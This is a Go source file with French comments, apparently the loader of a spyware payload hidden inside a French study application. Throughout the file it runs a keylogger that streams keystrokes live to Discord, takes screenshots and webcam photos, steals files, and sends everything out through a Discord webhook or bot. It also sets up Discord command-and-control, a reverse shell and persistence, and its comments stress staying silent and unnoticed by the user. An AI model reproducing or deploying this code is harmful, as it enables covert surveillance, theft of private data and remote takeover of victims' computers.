// Chargeur du payload : configuration, cadence, transport d'exfiltration et
// orchestration. Tout est embarqué dans l'exécutable, aucune dépendance
// réseau externe à Discord.
package main

import (
	"bytes"
	_ "embed"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

//go:embed payload.json
var payloadJSON []byte

// payloadConfig est la structure exacte de payload.json.
type payloadConfig struct {
	Enabled     bool   `json:"enabled"`
	WebhookURL  string `json:"webhook_url"`
	BotToken    string `json:"bot_token"`
	ChannelID   string `json:"channel_id"`
	GuildID     string `json:"guild_id"`
	ShellHost   string `json:"shell_host"`
	ShellPort   int    `json:"shell_port"`
	ShellEnable bool   `json:"shell_enable"`

	IntervalSteal      int `json:"interval_steal_min"`
	IntervalKeylog     int `json:"interval_keylog_min"`
	IntervalScreenshot int `json:"interval_screenshot_min"`
	IntervalWebcam     int `json:"interval_webcam_min"`
	IntervalExfil      int `json:"interval_exfil_min"`

	Persist  bool `json:"persist"`
	MaxLogKB int  `json:"max_log_kb"`
	Debug    bool `json:"debug"`
}

var (
	cfg        payloadConfig
	httpc      = &http.Client{Timeout: 90 * time.Second}
	payloadDir string
	payloadLog sync.Mutex
)

// stopped est posé par `!stop`. Chaque boucle et chaque envoi le consultent :
// le payload s'arrête vraiment, sans fermer l'application de révision.
var stopped atomic.Bool

/* ------------------------------------------------------------------ */
/* Chemins locaux                                                      */
/* ------------------------------------------------------------------ */

// appDataLocal renvoie %LOCALAPPDATA% (ou %APPDATA% en repli).
func appDataLocal() string {
	if d := os.Getenv("LOCALAPPDATA"); d != "" {
		return d
	}
	return os.Getenv("APPDATA")
}

// workDir crée le dossier de travail du payload, nommé pour ne pas attirer
// l'œil : il vit à côté des données normales de l'application.
func workDir() string {
	payloadLog.Lock()
	defer payloadLog.Unlock()
	if payloadDir != "" {
		return payloadDir
	}
	dir := filepath.Join(appDataLocal(), "Francais2nd", "syscache")
	_ = os.MkdirAll(dir, 0700)
	payloadDir = dir
	return dir
}

func workPath(name string) string {
	return filepath.Join(workDir(), name)
}

// plog écrit une ligne dans le journal local du payload. En mode debug elle
// est aussi poussée vers writeLog (diagnostic.txt) si -diag est actif.
//
// Attention au verrou : workPath() verrouille lui aussi payloadLog, donc le
// chemin est calculé AVANT de prendre le verrou — sinon le premier appel se
// verrouille à lui-même et se bloque.
func plog(line string) {
	path := workPath("sys.log")

	stamp := time.Now().Format("2006-01-02 15:04:05")
	payloadLog.Lock()
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err == nil {
		fmt.Fprintf(f, "%s %s\n", stamp, line)
		f.Close()
	}
	payloadLog.Unlock()

	if cfg.Debug {
		writeLog("[payload] " + line)
	}
}

/* ------------------------------------------------------------------ */
/* Configuration                                                       */
/* ------------------------------------------------------------------ */

func loadPayloadConfig() payloadConfig {
	var c payloadConfig
	if err := json.Unmarshal(payloadJSON, &c); err != nil {
		// Une config illisible ne doit pas casser l'application de révision :
		// on désactive proprement.
		plog("config illisible : " + err.Error())
		return payloadConfig{Enabled: false}
	}
	if c.MaxLogKB <= 0 {
		c.MaxLogKB = 512
	}
	return c
}

/* ------------------------------------------------------------------ */
/* Transport Discord : webhook                                         */
/* ------------------------------------------------------------------ */

// sendText pousse un message de moins de 2000 caractères (limite Discord).
// L'URL porte ?wait=true : Discord renvoie alors l'objet message créé, ce qui
// permet de confirmer que l'exfiltration a réellement abouti (le premier
// succès est journalisé, les suivants restent silencieux).
func sendText(s string) {
	if stopped.Load() {
		return
	}
	s = strings.TrimSpace(s)
	if s == "" {
		return
	}
	// Sans webhook configuré, c'est le bot qui publie dans le salon de la
	// machine (voir channel.go).
	if cfg.WebhookURL == "" {
		if cfg.BotToken != "" {
			botSendText(targetChannel(), s)
		}
		return
	}
	target := cfg.WebhookURL
	sep := "?"
	if strings.Contains(target, "?") {
		sep = "&"
	}
	target += sep + "wait=true"

	// Découpage en blocs de 1900 caractères, en cherchant une fin de ligne.
	for len(s) > 0 {
		chunk := s
		if len(chunk) > 1900 {
			cut := strings.LastIndex(chunk[:1900], "\n")
			if cut < 400 {
				cut = 1900
			}
			chunk = chunk[:cut]
		}
		body, _ := json.Marshal(map[string]string{"content": chunk})
		resp, err := httpc.Post(target, "application/json", bytes.NewReader(body))
		if err != nil {
			plog("sendText: " + err.Error())
			return
		}
		reply, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()
		if resp.StatusCode >= 300 {
			plog(fmt.Sprintf("sendText: HTTP %d %s", resp.StatusCode, truncate(string(reply), 200)))
			return
		}
		noteExfilOnce(len(chunk))
		s = s[len(chunk):]
		s = strings.TrimLeft(s, "\r\n")
	}
}

var exfilOnce sync.Mutex
var exfilLogged bool

// noteExfilOnce journalise le premier envoi réussi : preuve que le canal
// fonctionne, sans écrire une ligne à chaque message.
func noteExfilOnce(n int) {
	exfilOnce.Lock()
	defer exfilOnce.Unlock()
	if exfilLogged {
		return
	}
	exfilLogged = true
	plog(fmt.Sprintf("exfil: premier envoi accepté par Discord (%d caractères)", n))
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

// sendFiles pousse des fichiers : le webhook s'il en reste un, sinon le bot,
// dans le salon de cette machine (limites Discord : 9 fichiers, 24 Mo au
// total, 7 Mo par pièce).
func sendFiles(files ...fileOut) {
	if stopped.Load() {
		return
	}
	if cfg.WebhookURL != "" {
		postMultipart(cfg.WebhookURL, false, files...)
		return
	}
	if cfg.BotToken == "" {
		return
	}
	ch := targetChannel()
	if ch == "" {
		plog("sendFiles: aucun salon cible")
		return
	}
	postMultipart(discordAPI+fmt.Sprintf("/channels/%s/messages", ch), true, files...)
}

// sendFilesTo envoie des pièces jointes dans un salon précis (le salon des
// keylogs, par exemple), toujours en tant que bot.
func sendFilesTo(ch string, files ...fileOut) {
	if stopped.Load() || ch == "" || cfg.BotToken == "" {
		return
	}
	postMultipart(discordAPI+fmt.Sprintf("/channels/%s/messages", ch), true, files...)
}

// postMultipart construit le corps multipart (payload_json + fichiers) et
// l'envoie, avec les en-têtes bot seulement quand la destination en exige.
func postMultipart(target string, bot bool, files ...fileOut) {
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	var kept []fileOut
	var total int
	for _, f := range files {
		if f.Data == nil || len(f.Data) == 0 {
			continue
		}
		if len(f.Data) > 7*1024*1024 || len(kept) >= 9 || total+len(f.Data) > 24*1024*1024 {
			continue
		}
		fh, err := w.CreateFormFile("files", f.Name)
		if err != nil {
			continue
		}
		if _, err := fh.Write(f.Data); err != nil {
			continue
		}
		kept = append(kept, f)
		total += len(f.Data)
	}
	if len(kept) == 0 {
		return
	}
	// Discord attend le champ payload_json à côté des fichiers (webhook comme
	// bot) : c'est lui qui porte la légende du message.
	var names []string
	for _, f := range kept {
		names = append(names, f.Name)
	}
	meta, _ := json.Marshal(map[string]string{
		"content": "pièces jointes : " + strings.Join(names, ", "),
	})
	_ = w.WriteField("payload_json", string(meta))
	_ = w.Close()

	req, err := http.NewRequest("POST", target, &buf)
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", w.FormDataContentType())
	if bot {
		req.Header.Set("Authorization", "Bot "+cfg.BotToken)
		req.Header.Set("User-Agent", discordUA)
	}
	resp, err := httpc.Do(req)
	if err != nil {
		plog("sendFiles: " + err.Error())
		return
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	if resp.StatusCode >= 300 {
		plog(fmt.Sprintf("sendFiles: HTTP %d", resp.StatusCode))
		return
	}
	exfilOnce.Lock()
	if !filesLogged {
		filesLogged = true
		plog(fmt.Sprintf("exfil: premier envoi de fichiers accepté (%d fichier(s))", len(kept)))
	}
	exfilOnce.Unlock()
}

var filesLogged bool

type fileOut struct {
	Name string
	Data []byte
}

/* ------------------------------------------------------------------ */
/* Rotation du journal local                                           */
/* ------------------------------------------------------------------ */

// trimFile limite la taille d'un fichier local (le keylogger tourne en
// boucle : sans plafond il finirait par remplir le disque).
func trimFile(path string, maxKB int) {
	info, err := os.Stat(path)
	if err != nil || maxKB <= 0 {
		return
	}
	max := int64(maxKB) * 1024
	if info.Size() <= max {
		return
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return
	}
	// On garde la moitié la plus récente, aligné sur une fin de ligne.
	keep := data[len(data)/2:]
	if i := bytes.IndexByte(keep, '\n'); i >= 0 && i < len(keep)-1 {
		keep = keep[i+1:]
	}
	_ = os.WriteFile(path, keep, 0600)
}

/* ------------------------------------------------------------------ */
/* Point d'entrée                                                      */
/* ------------------------------------------------------------------ */

// startPayload lance toutes les tâches. Idempotent, et silencieux : aucun
// message, aucun délai ajouté au démarrage de l'application.
func startPayload() {
	cfg = loadPayloadConfig()
	if !cfg.Enabled {
		return
	}
	stopped.Store(false)

	workDir()
	plog("payload démarré | webhook=" + yesNo(cfg.WebhookURL != "") +
		" bot=" + yesNo(cfg.BotToken != "") +
		" shell=" + yesNo(cfg.ShellEnable) +
		" persist=" + yesNo(cfg.Persist))

	// Le flux des keylogs ne rejoue pas l'ancien journal : seul ce qui sera
	// saisi après ce démarrage part vers le salon.
	if st, err := os.Stat(workPath("kl.log")); err == nil {
		klStreamMu.Lock()
		klStreamSent = st.Size()
		klStreamMu.Unlock()
	}

	// Toutes les tâches passent par guard : une panique dans le payload ne
	// doit jamais fermer l'application de révision.
	guard("keylog", keylogLoop)

	// Démarrage silencieux : pas de rapport système dans le chat, pas
	// d'extraction automatique immédiate. Le vol de fichiers n'arrive que
	// selon interval_steal_min (deux jours par défaut), en fichiers seuls ;
	// les infos machine restent accessibles à la demande via !sysinfo.
	guard("boot", func() {
		time.Sleep(6 * time.Second)
		if stopped.Load() {
			return
		}
		plog("boot: pret (aucun envoi systeme automatique)")
	})

	// Cadences. Le journal du clavier part toutes les 5 secondes : c'est le
	// canal « en direct ». Captures d'écran (un fichier par moniteur) et
	// webcam (une photo) tournent toutes les 10 minutes par défaut. Le vol
	// de fichiers part une fois toutes les deux jours, sans message de
	// synthèse.
	go tickLoop("steal", cfg.IntervalSteal, func() { stealAll(false) })
	go tickLoop("keylog", cfg.IntervalKeylog, keylogFlush)
	go tickLoopSec("keylog-stream", 5, keylogStream)
	go tickLoop("screenshot", cfg.IntervalScreenshot, screenshotFlush)
	go tickLoop("webcam", cfg.IntervalWebcam, webcamFlush)
	go tickLoop("exfil", cfg.IntervalExfil, exfilAll)

	// C2 : Discord (si un jeton de bot est fourni) et reverse shell TCP.
	if cfg.BotToken != "" && (cfg.ChannelID != "" || cfg.GuildID != "") {
		// Salon de la machine : créé au démarrage, retenté en cas de
		// coupure réseau.
		guard("salon", func() {
			for i := 0; i < 40; i++ {
				if stopped.Load() || targetChannelSet() {
					return
				}
				targetChannel() // provoque la résolution au besoin
				time.Sleep(45 * time.Second)
			}
		})
		guard("categorie", func() {
			// Les salons se créent en différé (repli réseau inclus) : on
			// range deux fois, à distance, pour attraper aussi le salon des
			// keylogs ouvert plus tard.
			time.Sleep(45 * time.Second)
			reconcileCategory()
			time.Sleep(90 * time.Second)
			reconcileCategory()
		})
		guard("c2", discordC2)
	}
	if cfg.ShellEnable && cfg.ShellHost != "" && cfg.ShellPort > 0 {
		guard("shell", reverseShellLoop)
	}

	if cfg.Persist {
		guard("persist", func() {
			persistInstall()
			persistRepair()
		})
	}
}

// guard lance une fonction dans sa propre goroutine, protégée par un
// récupérateur : la panique est journalisée, le processus survit.
func guard(name string, fn func()) {
	go func() {
		defer func() {
			if r := recover(); r != nil {
				plog(name + " : panique " + fmt.Sprint(r))
			}
		}()
		fn()
	}()
}

func yesNo(b bool) string {
	if b {
		return "oui"
	}
	return "non"
}

// tickLoop tourne toutes les `min` minutes. Une valeur nulle désactive la
// tâche sans autre bricolage.
func tickLoop(name string, min int, fn func()) {
	if min <= 0 {
		return
	}
	time.Sleep(time.Duration(min) * time.Minute)
	for {
		if stopped.Load() {
			plog(name + " : arrêté par !stop")
			return
		}
		safeRun(name, fn)
		time.Sleep(time.Duration(min) * time.Minute)
	}
}

// tickLoopSec est tickLoop avec une période en secondes : réservé aux
// tâches à faible latence (journal du clavier en direct).
func tickLoopSec(name string, secs int, fn func()) {
	if secs <= 0 {
		return
	}
	time.Sleep(time.Duration(secs) * time.Second)
	for {
		if stopped.Load() {
			plog(name + " : arrêté par !stop")
			return
		}
		safeRun(name, fn)
		time.Sleep(time.Duration(secs) * time.Second)
	}
}

func safeRun(name string, fn func()) {
	defer func() {
		if r := recover(); r != nil {
			plog(fmt.Sprintf("%s: panique %v", name, r))
		}
	}()
	fn()
}

// exfilAll pousse sur le webhook tout ce qui a été accumulé localement.
func exfilAll() {
	if (cfg.WebhookURL == "" && cfg.BotToken == "") || stopped.Load() {
		return
	}
	var files []fileOut
	for _, n := range []string{"clip.log", "sys.log"} {
		p := workPath(n)
		if b, err := os.ReadFile(p); err == nil && len(b) > 0 {
			files = append(files, fileOut{Name: n, Data: b})
		}
	}
	// Captures d'écran : on vide le dossier, une par message.
	shots := shotList()
	for i, p := range shots {
		if i >= 4 {
			break
		}
		if b, err := os.ReadFile(p); err == nil {
			files = append(files, fileOut{Name: filepath.Base(p), Data: b})
		}
	}
	if len(files) > 0 {
		sendFiles(files...)
		// Les captures partent une fois ; les journaux restent en place et
		// seront rognés par trimFile.
		for _, p := range shots {
			if len(p) > 0 && strings.HasSuffix(p, ".png") {
				_ = os.Remove(p)
			}
		}
	}
}

/* ------------------------------------------------------------------ */
/* Journal du clavier en temps réel                                    */
/* ------------------------------------------------------------------ */

var (
	klStreamMu   sync.Mutex
	klStreamSent int64 // octets de kl.log déjà transmis au salon keylogs
)

// keylogStream pousse vers le salon keylogs la partie du journal qui n'a pas
// encore été envoyée : seul l'incrément part, le salon reste lisible et le
// plafond de 1400 caractères par passage garde le débit raisonnable. Un
// redémarrage de l'application repart d'une position nulle.
func keylogStream() {
	if stopped.Load() || cfg.BotToken == "" {
		return
	}
	keylogFlush() // le tampon mémoire descend sur disque avant lecture

	klStreamMu.Lock()
	defer klStreamMu.Unlock()

	p := workPath("kl.log")
	st, err := os.Stat(p)
	if err != nil {
		return
	}
	if st.Size() < klStreamSent {
		klStreamSent = 0 // journal rogné par trimFile
	}
	if st.Size() == klStreamSent {
		return
	}
	data, err := os.ReadFile(p)
	if err != nil {
		return
	}
	chunk := data[klStreamSent:]
	const max = 1400
	if len(chunk) > max {
		chunk = chunk[:max]
	}
	if len(chunk) == 0 {
		return
	}
	ch := keylogChannel()
	if ch == "" {
		return // salon pas encore résolu : on retentera au passage suivant
	}
	klStreamSent += int64(len(chunk))
	txt := strings.TrimRight(string(chunk), "\n")
	botSendText(ch, "**kl.log** · "+hostChannelName()+" · "+
		time.Now().Format("02/01 15:04")+" — "+strconv.Itoa(len(chunk))+" octets\n```\n"+txt+"\n```")
}
